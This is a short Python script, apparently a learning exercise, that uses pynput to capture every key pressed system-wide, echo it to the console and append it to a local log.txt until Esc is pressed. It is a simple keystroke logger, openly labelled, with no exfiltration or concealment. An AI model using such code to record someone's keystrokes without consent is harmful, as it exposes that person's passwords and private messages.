from pynput.keyboard import Key, Listener

numbers = {
    '<96>': '0', '<97>': '1', '<98>': '2', '<99>': '3', '<100>': '4', '<101>': '5', '<102>': '6', '<103>': '7',
    '<104>': '8', '<105>': '9'
}


def on_press(key):
    key = str(key).replace("'", "")

    try:
        if key.find('>') > 0:
            key = numbers[key]
    except KeyError:
        key = "[Error]"

    save(key)

    print(f"'{key}' pressed")


def on_release(key):
    if key == Key.esc:
        return False


# save every pressed key in a log file
def save(key):
    with open("log.txt", "a") as log:
        if key.find("space") > 0:
            log.write(' ')
        elif key.find("enter") > 0:
            log.write('\n')
        elif key.find("Key") == -1:
            log.write(key)


if __name__ == '__main__':
    print("start listening...")

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    print("---------- finish listening ----------")
